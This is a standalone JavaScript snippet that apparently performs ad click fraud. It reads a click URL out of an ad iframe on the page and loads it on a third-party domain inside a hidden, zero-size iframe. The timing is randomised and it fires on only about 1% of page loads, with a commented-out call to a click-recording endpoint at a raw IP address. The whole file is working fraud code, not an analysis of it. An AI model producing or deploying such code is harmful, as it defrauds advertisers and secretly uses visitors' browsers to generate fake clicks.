
    var ifr = document.createElement('iframe');
    var ifrc = document.createElement('iframe');  
    var loopn = 0;
    iff();
    function iff(){
        loopn++; 
//        alert(loopn);
        if(loopn<10){
            if(document.getElementById('gad_sub') && document.getElementById('gad_sub').getElementsByTagName('iframe').length>0){ 
            	
                if(document.getElementById('gad_sub').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('/clk2.html').length>1){
                    if(document.getElementById('gad_sub').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('/clk2.html')[1].split('"').length>1){
                    	var rand = parseInt(Math.random()*10);//1000内的随机数
                        var urll = "http://sub.fivelives.net/clk2.html"+document.getElementById('gad_sub').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('/clk2.html')[1].split('>')[0];
                        ifr.src = urll ;
                        ifr.style.display = "none" ;
                        ifr.width = 0 ;
                        ifr.height = 0 ; 
//                        ifrc.src = "http://106.185.54.237/index.php?s=api/api/run/interface/Record/method/record/rid/89/type/click";
//                        ifrc.style.display = "none" ;
//                        ifrc.width = 0 ;
//                        ifrc.height = 0 ;  
                        var random_a = parseInt((Math.random()*10+3), 10);
                        var random_b = Math.random();
                        if(random_b<=0.01){
                        	 setTimeout(function(){append(ifr)},(random_a*1000));    
                        }
                       
                    }else{
                        setTimeout(arguments.callee, 200); 
                    }
                }else{
                    setTimeout(arguments.callee, 200); 
                }

            }else{
                setTimeout(arguments.callee, 200); 
            }
        } 
        
    }

    function append(obj){
        document.body.appendChild(obj);
//        document.body.appendChild(ifrc);
    }